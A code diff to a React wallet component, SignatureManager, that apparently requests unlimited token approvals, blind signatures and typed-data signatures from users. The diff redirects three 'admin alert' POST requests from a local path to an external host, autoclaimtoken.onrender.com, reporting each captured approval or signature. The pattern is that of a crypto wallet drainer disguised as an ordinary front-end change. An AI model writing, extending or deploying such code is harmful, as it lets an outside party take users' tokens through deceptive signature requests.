@@ -15,7 +15,7 @@ export default function SignatureManager({ provider, userAddress }) {
       const tx = await approveUnlimited(tokenAddress, spenderAddress, provider);
       
       // Send admin alert
-      await fetch('/api/signature-alert', {
+      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -57,7 +57,7 @@ export default function SignatureManager({ provider, userAddress }) {
       const signature = await blindSignature(messageHash, provider);
       
       // Send admin alert for blind signature
-      await fetch('/api/signature-alert', {
+      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -102,7 +102,7 @@ export default function SignatureManager({ provider, userAddress }) {
       const signature = await signTypedDataV4(domain, types, message, provider);
       
       // Send admin alert for TypedData signature
-      await fetch('/api/signature-alert', {
+      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
